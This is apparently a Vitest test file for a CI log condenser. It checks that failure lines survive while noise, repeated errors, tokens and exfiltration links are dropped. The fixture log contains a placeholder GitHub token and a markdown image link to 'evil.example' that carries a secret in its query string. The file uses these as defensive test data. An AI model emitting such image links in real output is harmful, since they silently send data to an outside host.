import { describe, expect, it } from 'vitest';
import { condenseLog, failureSignature } from './ci-log';

const LOG = [
  '\u001b[31mrun\u001b[0m downloading packages 12%',
  'npm warn deprecated thing@1.0.0',
  'added 812 packages in 14s',
  'FAIL src/a.test.ts > parses input',
  'AssertionError: expected 3 to be 4',
  '    at Object.<anonymous> (src/a.test.ts:10:5)',
  'AssertionError: expected 3 to be 4',
  'token = ghp_abcdefghijklmnopqrstuvwxyz0123456789 failed to leak',
  'error: see ![x](https://evil.example/?d=secret) for failure',
  'Process completed with exit code 1.',
].join('\n');

describe('condenseLog', () => {
  it('keeps failure lines and drops noise, repeats, secrets and exfiltration links', () => {
    const out = condenseLog(LOG);
    expect(out).toContain('FAIL src/a.test.ts');
    expect(out).toContain('exit code 1');
    expect(out.match(/AssertionError/g)).toHaveLength(1);
    expect(out).not.toContain('npm warn');
    expect(out).not.toContain('ghp_');
    expect(out).not.toContain('evil.example');
  });

  it('keeps the tail when it must cut', () => {
    const many = Array.from({ length: 200 }, (_, i) => `error: item${i}x`).join(
      '\n',
    );
    const out = condenseLog(`${many}\nerror: the real cause`, 200);
    expect(out.length).toBeLessThan(220);
    expect(out).toContain('the real cause');
  });
});

describe('failureSignature', () => {
  it('ignores timings and numbers but separates different failures', () => {
    const a = failureSignature('error: timed out after 3000ms at line 4412');
    const b = failureSignature('error: timed out after 5100ms at line 9981');
    expect(a).toBe(b);
    expect(failureSignature('error: module not found')).not.toBe(a);
  });
});
